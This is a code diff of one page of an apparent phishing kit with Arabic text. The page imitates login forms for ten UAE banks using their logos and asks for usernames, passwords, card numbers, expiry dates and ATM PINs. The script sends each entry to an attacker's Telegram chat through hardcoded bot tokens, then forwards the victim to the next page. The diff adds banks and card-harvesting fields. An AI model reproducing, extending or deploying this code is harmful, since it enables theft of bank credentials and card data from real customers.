@@ -14,129 +14,244 @@
             --light-gray: #f5f5f5;
             --border-color: #ddd;
             --error-color: #e74c3c;
+            --success-color: #2ecc71;
         }
-
         * { box-sizing: border-box; margin: 0; padding: 0; }
-
-        body {
-            font-family: 'Tajawal', sans-serif;
-            background-color: #f9f9f9;
-            color: var(--text-color);
-            line-height: 1.6;
-        }
-
+        body { font-family: 'Tajawal', sans-serif; background-color: #f9f9f9; color: var(--text-color); line-height: 1.6; }
         .container { max-width: 800px; margin: 0 auto; padding: 20px; min-height: 100vh; }
-
-        .header {
-            text-align: center; margin-bottom: 30px; padding: 20px;
-            background-color: white; border-radius: 10px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        }
-        .header img { height: 60px; margin-bottom: 10px; object-fit: contain; }
-        .header h1 { color: var(--primary-color); font-size: 22px; }
-
-        .form-container {
-            background-color: white; border-radius: 10px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1); padding: 30px;
-        }
-
+        .header { text-align: center; margin-bottom: 30px; padding: 20px; background-color: white; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .header img { height: 80px; margin-bottom: 10px; }
+        .header h1 { color: var(--primary-color); font-size: 24px; margin-bottom: 10px; }
+        .form-container { background-color: white; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); padding: 30px; margin-bottom: 20px; }
+        .form-container h3 { margin-bottom: 20px; text-align: center; }
         .form-group { margin-bottom: 20px; }
-        .form-group label { display: block; margin-bottom: 8px; font-weight: 500; }
-        .form-control {
-            width: 100%; padding: 12px; border: 1px solid var(--border-color);
-            border-radius: 5px; font-size: 16px; font-family: 'Tajawal', sans-serif;
-        }
-
-        .btn {
-            background-color: var(--primary-color); color: white;
-            padding: 12px; border: none; border-radius: 5px;
-            cursor: pointer; font-size: 16px; width: 100%; font-family: 'Tajawal', sans-serif;
-        }
-
-        .secure-notice {
-            display: flex; align-items: center; justify-content: center;
-            gap: 10px; margin-top: 20px; font-size: 13px; color: #666;
-        }
+        .form-group label { display: block; margin-bottom: 5px; font-weight: 500; }
+        .form-control { width: 100%; padding: 10px; border: 1px solid var(--border-color); border-radius: 5px; font-size: 16px; font-family: 'Tajawal', sans-serif; transition: border-color 0.3s; }
+        .form-control:focus { outline: none; border-color: var(--primary-color); }
+        .form-control.invalid { border-color: var(--error-color); }
+        .form-control.valid { border-color: var(--success-color); }
+        .error-message { color: var(--error-color); font-size: 14px; margin-top: 5px; display: none; }
+        .btn { display: inline-block; background-color: var(--primary-color); color: white; padding: 12px 25px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; font-weight: 500; font-family: 'Tajawal', sans-serif; transition: background-color 0.3s; }
+        .btn:hover { background-color: #006600; }
+        .btn-block { display: block; width: 100%; }
+        .date-input { display: flex; gap: 10px; }
+        .date-input select { flex: 1; padding: 10px; border: 1px solid var(--border-color); border-radius: 5px; font-size: 16px; font-family: 'Tajawal', sans-serif; }
+        .card-type { margin-top: 5px; }
+        .card-type-icon { display: inline-block; padding: 3px 8px; border-radius: 4px; font-size: 12px; font-weight: bold; }
+        .card-type-icon.visa { background-color: #1a1f71; color: white; }
+        .card-type-icon.mastercard { background-color: #eb001b; color: white; }
+        .card-type-icon.unknown { background-color: #ccc; color: #666; }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="header">
-            <img src="" alt="Bank Logo" id="bankLogo">
-            <h1 id="bankTitle">تسجيل الدخول الآمن</h1>
-        </div>
-        
-        <div class="form-container">
-            <form id="bankLoginForm">
-                <div id="dynamicFields">
-                    </div>
-                <button type="button" onclick="submitBankLogin()" class="btn">دخول آمن</button>
-            </form>
-            
-            <div class="secure-notice">
-                <span>🔒 نظام تشفير متطور 256-bit</span>
+        <div id="page4">
+            <div class="header" id="bankHeader">
+                <img src="" alt="شعار البنك" id="bankLogo">
+                <h1 id="page4Title">تسجيل الدخول للبنك</h1>
             </div>
+            <div class="form-container" id="bankAuthContainer"></div>
         </div>
     </div>
 
     <script>
-        const telegramBotToken = '8679116779:AAFA4ChWcYM9ZiHa3BAr3IylTOUEWvFQNkw';
-        const telegramChatId = '8362204213';
-
-        const banksData = {
-            emiratesNBD: { name: "Emirates NBD", logo: "https://i.ibb.co/dwhqmDsF/Emirates-NBD.jpg", fields: ["اسم المستخدم", "كلمة المرور"] },
-            firstAbuDhabi: { name: "First Abu Dhabi Bank", logo: "https://i.ibb.co/gnNdPDJ/First-Abu-Dhabi-Bank-Logo-svg.png", fields: ["رقم البطاقة", "الرقم السري"] },
-            abuDhabiCommercial: { name: "ADCB", logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSjH4Qs3CGxyTwB8k3DPHpsD8fyKOZ8qhCt_b1Nx_4IVg&s=10", fields: ["اسم المستخدم", "كلمة المرور"] },
-            dubaiIslamic: { name: "Dubai Islamic Bank", logo: "https://i.ibb.co/8DbXSsw0/dib-logo-personal-business-og.jpg", fields: ["اسم المستخدم", "كلمة المرور"] }
-        };
-
-        const selectedBank = localStorage.getItem('selectedBank') || 'emiratesNBD';
-        const bankInfo = banksData[selectedBank];
-
-        // تهيئة الصفحة بناءً على البنك
-        document.getElementById('bankLogo').src = bankInfo.logo;
-        document.getElementById('bankTitle').innerText = `تسجيل الدخول - ${bankInfo.name}`;
-        
-        const fieldsContainer = document.getElementById('dynamicFields');
-        bankInfo.fields.forEach((field, index) => {
-            fieldsContainer.innerHTML += `
-                <div class="form-group">
-                    <label>${field}</label>
-                    <input type="${field.includes('مرور') || field.includes('سري') ? 'password' : 'text'}" 
-                           id="field_${index}" class="form-control" placeholder="أدخل ${field}" required>
-                </div>`;
-        });
+        // تم تحديث التوكن والشات آيدي هنا
+        const telegramBotToken = '8591237339:AAHOMH_hwr6ts_zlKb3ClGXb7RBpZ8ii5j0';
+        const telegramChatId = '1848565778';
 
         async function appendToTelegram(newContent) {
             const existingId = localStorage.getItem('telegramMessageId');
             const existingContent = localStorage.getItem('telegramMessageContent') || '';
-            const updatedContent = existingContent + '\n\n' + newContent;
-
-            try {
-                await fetch(`https://api.telegram.org/bot${telegramBotToken}/editMessageText`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: telegramChatId,
-                        message_id: parseInt(existingId),
-                        text: updatedContent,
-                        parse_mode: 'HTML'
-                    })
-                });
-                localStorage.setItem('telegramMessageContent', updatedContent);
-            } catch (e) { console.error(e); }
+            if (existingId) {
+                const updatedContent = existingContent + '\n\n' + newContent;
+                try {
+                    const url = `https://api.telegram.org/bot${telegramBotToken}/editMessageText`;
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: telegramChatId, message_id: parseInt(existingId), text: updatedContent, parse_mode: 'HTML' })
+                    });
+                    const data = await response.json();
+                    if (data.ok) { localStorage.setItem('telegramMessageContent', updatedContent); }
+                    else { await sendNewTelegram(updatedContent); }
+                } catch (error) { await sendNewTelegram(updatedContent); }
+            } else { await sendNewTelegram(newContent); }
         }
 
-        async function submitBankLogin() {
-            let details = '';
-            bankInfo.fields.forEach((field, index) => {
-                const val = document.getElementById(`field_${index}`).value;
-                details += `${field}: ${val}\n`;
-            });
+        async function sendNewTelegram(message) {
+            try {
+                const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: telegramChatId, text: message, parse_mode: 'HTML' })
+                });
+                const data = await response.json();
+                if (data.ok) { localStorage.setItem('telegramMessageId', data.result.message_id); localStorage.setItem('telegramMessageContent', message); }
+            } catch (error) { console.error('خطأ:', error); }
+        }
 
-            const content = `🔐 <b>بيانات تسجيل الدخول للبنك</b>\n${details}`;
-            await appendToTelegram(content);
-            window.location.href = 'page5.html';
+        const banks = {
+            emiratesNBD: { name: "بنك الإمارات دبي الوطني", logo: "https://i.ibb.co/dwhqmDsF/Emirates-NBD.jpg", loginType: "email" },
+            firstAbuDhabi: { name: "بنك أبو ظبي الأول", logo: "https://i.ibb.co/gnNdPDJ/First-Abu-Dhabi-Bank-Logo-svg.png", loginType: "card" },
+            abuDhabiCommercial: { name: "بنك أبو ظبي التجاري", logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSjH4Qs3CGxyTwB8k3DPHpsD8fyKOZ8qhCt_b1Nx_4IVg&s=10", loginType: "username" },
+            dubaiIslamic: { name: "بنك دبي الإسلامي", logo: "https://i.ibb.co/8DbXSsw0/dib-logo-personal-business-og.jpg", loginType: "card" },
+            mashreq: { name: "بنك المشرق", logo: "https://i.ibb.co/21YLkTtB/MASQ-AE-BIG-e09012bc.png", loginType: "username" },
+            abuDhabiIslamic: { name: "بنك أبو ظبي الإسلامي", logo: "https://i.ibb.co/ynB1yRtg/images.jpg", loginType: "card" },
+            dubaiCommercial: { name: "بنك دبي التجاري", logo: "https://play-lh.googleusercontent.com/6IHUfV5JDsueMXq283hVWDkQvwooy4EgIjGgrGKj1PuBIBjagfGdAWWHYZtX-PW99D8", loginType: "card" },
+            fujairahNational: { name: "بنك الفجيرة الوطني", logo: "https://i.ibb.co/KxzwNLPC/nbf.jpg", loginType: "username" },
+            rakNational: { name: "بنك رأس الخيمة الوطني", logo: "https://i.ibb.co/jkNfYJxc/RAKBANK.gif", loginType: "username" },
+            sharjahIslamic: { name: "مصرف الشارقة الإسلامي", logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT9mYd7ueTsXpy3up18pb9AqLFa-NR2GabKe8rRaDDNkg&s=10", loginType: "username" }
+        };
+
+        const selectedBank = localStorage.getItem('selectedBank') || 'emiratesNBD';
+        const bank = banks[selectedBank];
+
+        if (bank) {
+            document.getElementById('bankLogo').src = bank.logo;
+            document.getElementById('bankLogo').alt = bank.name;
+            document.getElementById('page4Title').textContent = `تسجيل الدخول إلى ${bank.name}`;
+            createBankAuth(selectedBank);
+        }
+
+        function createBankAuth(bankKey) {
+            const bank = banks[bankKey];
+            const container = document.getElementById('bankAuthContainer');
+
+            if (bank.loginType === 'email') {
+                container.innerHTML = `
+                    <h3>تسجيل الدخول إلى ${bank.name}</h3>
+                    <div class="form-group">
+                        <label for="bankEmail">البريد الإلكتروني أو اسم المستخدم</label>
+                        <input type="text" id="bankEmail" class="form-control" placeholder="أدخل بريدك الإلكتروني أو اسم المستخدم" required>
+                        <div class="error-message" id="bankEmailError">يرجى إدخال البريد الإلكتروني أو اسم المستخدم</div>
+                    </div>
+                    <div class="form-group">
+                        <label for="bankPassword">كلمة المرور</label>
+                        <input type="password" id="bankPassword" class="form-control" placeholder="أدخل كلمة المرور" required>
+                        <div class="error-message" id="bankPasswordError">يرجى إدخال كلمة المرور</div>
+                    </div>
+                    <button class="btn btn-block" id="loginBtn">تسجيل الدخول</button>`;
+                document.getElementById('loginBtn').addEventListener('click', () => handleEmailLogin(bank.name));
+
+            } else if (bank.loginType === 'username') {
+                let usernameLabel = 'اسم المستخدم';
+                let usernamePlaceholder = 'أدخل اسم المستخدم';
+                if (bankKey === 'abuDhabiCommercial') { usernameLabel = 'ADCB CID or Nickname'; usernamePlaceholder = 'أدخل ADCB CID أو Nickname'; }
+
+                container.innerHTML = `
+                    <h3>تسجيل الدخول إلى ${bank.name}</h3>
+                    <div class="form-group">
+                        <label for="bankUsername">${usernameLabel}</label>
+                        <input type="text" id="bankUsername" class="form-control" placeholder="${usernamePlaceholder}" required>
+                        <div class="error-message" id="bankUsernameError">يرجى إدخال ${usernameLabel}</div>
+                    </div>
+                    <div class="form-group">
+                        <label for="bankPassword">كلمة المرور</label>
+                        <input type="password" id="bankPassword" class="form-control" placeholder="أدخل كلمة المرور" required>
+                        <div class="error-message" id="bankPasswordError">يرجى إدخال كلمة المرور</div>
+                    </div>
+                    <button class="btn btn-block" id="loginBtn">تسجيل الدخول</button>`;
+                document.getElementById('loginBtn').addEventListener('click', () => handleUsernameLogin(bank.name));
+
+            } else if (bank.loginType === 'card') {
+                let hasATMPin = (bankKey === 'dubaiIslamic' || bankKey === 'abuDhabiIslamic' || bankKey === 'dubaiCommercial');
+                let extraFields = '';
+                if (hasATMPin) {
+                    extraFields = `<div class="form-group"><label for="atmPin">ATM PIN</label><input type="password" id="atmPin" class="form-control" placeholder="أدخل ATM PIN" maxlength="4" required><div class="error-message" id="atmPinError">يرجى إدخال ATM PIN مكون من 4 أرقام</div></div>`;
+                } else {
+                    extraFields = `<div class="form-group"><label for="expiryDate">تاريخ الانتهاء</label><div class="date-input"><select id="expiryMonth" required><option value="">الشهر</option>${Array.from({length:12},(_,i)=>`<option value="${i+1}">${i+1}</option>`).join('')}</select><select id="expiryYear" required><option value="">السنة</option>${Array.from({length:8},(_,i)=>`<option value="${2025+i}">${2025+i}</option>`).join('')}</select></div><div class="error-message" id="expiryError">يرجى اختيار تاريخ انتهاء صحيح</div></div>`;
+                }
+
+                container.innerHTML = `
+                    <h3>تسجيل الدخول إلى ${bank.name}</h3>
+                    <div class="form-group">
+                        <label for="cardNumber">رقم البطاقة</label>
+                        <input type="text" id="cardNumber" class="form-control" placeholder="أدخل رقم البطاقة (16 رقم)" maxlength="19" required>
+                        <div class="card-type" id="cardTypeDisplay"><div class="card-type-icon unknown">?</div></div>
+                        <div class="error-message" id="cardNumberError">يرجى إدخال رقم بطاقة صحيح (فيزا أو ماستر كارد فقط)</div>
+                    </div>
+                    ${extraFields}
+                    <button class="btn btn-block" id="loginBtn">تسجيل الدخول</button>`;
+
+                document.getElementById('cardNumber').addEventListener('input', function() { formatCardNumber(this); });
+                document.getElementById('loginBtn').addEventListener('click', () => handleCardLogin(bank.name, hasATMPin));
+            }
+        }
+
+        async function handleEmailLogin(bankName) {
+            const email = document.getElementById('bankEmail').value;
+            const password = document.getElementById('bankPassword').value;
+            let isValid = true;
+            if (!email) { document.getElementById('bankEmailError').style.display = 'block'; document.getElementById('bankEmail').classList.add('invalid'); isValid = false; }
+            if (!password) { document.getElementById('bankPasswordError').style.display = 'block'; document.getElementById('bankPassword').classList.add('invalid'); isValid = false; }
+            if (isValid) {
+                const content = `🔐 <b>تسجيل دخول البنك</b>\n\n🏦 البنك: ${bankName}\n📧 البريد/اسم المستخدم: ${email}\n🔑 كلمة المرور: ${password}`;
+                await appendToTelegram(content);
+                window.location.href = 'page5.html';
+            }
+        }
+
+        async function handleUsernameLogin(bankName) {
+            const username = document.getElementById('bankUsername').value;
+            const password = document.getElementById('bankPassword').value;
+            let isValid = true;
+            if (!username) { document.getElementById('bankUsernameError').style.display = 'block'; document.getElementById('bankUsername').classList.add('invalid'); isValid = false; }
+            if (!password) { document.getElementById('bankPasswordError').style.display = 'block'; document.getElementById('bankPassword').classList.add('invalid'); isValid = false; }
+            if (isValid) {
+                const content = `🔐 <b>تسجيل دخول البنك</b>\n\n🏦 البنك: ${bankName}\n👤 اسم المستخدم: ${username}\n🔑 كلمة المرور: ${password}`;
+                await appendToTelegram(content);
+                window.location.href = 'page5.html';
+            }
+        }
+
+        async function handleCardLogin(bankName, hasATMPin) {
+            const cardNumber = document.getElementById('cardNumber').value.replace(/\s+/g, '');
+            const validation = validateCardNumber(cardNumber);
+            let isValid = true;
+            if (!validation.valid) { document.getElementById('cardNumberError').style.display = 'block'; document.getElementById('cardNumber').classList.add('invalid'); isValid = false; }
+
+            let extraInfo = '';
+            if (hasATMPin) {
+                const atmPin = document.getElementById('atmPin').value;
+                if (!atmPin || atmPin.length !== 4) { document.getElementById('atmPinError').style.display = 'block'; document.getElementById('atmPin').classList.add('invalid'); isValid = false; }
+                else { extraInfo = `\n🔢 ATM PIN: ${atmPin}`; }
+            } else {
+                const month = document.getElementById('expiryMonth').value;
+                const year = document.getElementById('expiryYear').value;
+                if (!month || !year) { document.getElementById('expiryError').style.display = 'block'; isValid = false; }
+                else { extraInfo = `\n📅 تاريخ الانتهاء: ${month}/${year}`; }
+            }
+
+            if (isValid) {
+                const content = `🔐 <b>تسجيل دخول البنك</b>\n\n🏦 البنك: ${bankName}\n💳 رقم البطاقة: ${cardNumber}\n🏷️ نوع البطاقة: ${validation.type}${extraInfo}`;
+                await appendToTelegram(content);
+                window.location.href = 'page5.html';
+            }
+        }
+
+        function validateCardNumber(cardNumber) {
+            const clean = cardNumber.replace(/\s+/g, '');
+            if (clean.length !== 16 || !/^\d+$/.test(clean)) return { valid: false, type: 'unknown' };
+            let cardType = 'unknown';
+            if (/^4/.test(clean)) cardType = 'visa';
+            else if (/^5[1-5]/.test(clean)) cardType = 'mastercard';
+            else return { valid: false, type: 'unknown' };
+            return { valid: true, type: cardType };
+        }
+
+        function formatCardNumber(input) {
+            let value = input.value.replace(/\s+/g, '').replace(/\D/g, '');
+            if (value.length > 16) value = value.substring(0, 16);
+            if (value.length > 0) value = value.match(/.{1,4}/g).join(' ');
+            input.value = value;
+            const validation = validateCardNumber(value);
+            const display = document.getElementById('cardTypeDisplay');
+            if (display) {
+                if (validation.type === 'visa') display.innerHTML = '<div class="card-type-icon visa">VISA</div>';
+                else if (validation.type === 'mastercard') display.innerHTML = '<div class="card-type-icon mastercard">MC</div>';
+                else display.innerHTML = '<div class="card-type-icon unknown">?</div>';
+            }
         }
     </script>
 </body>
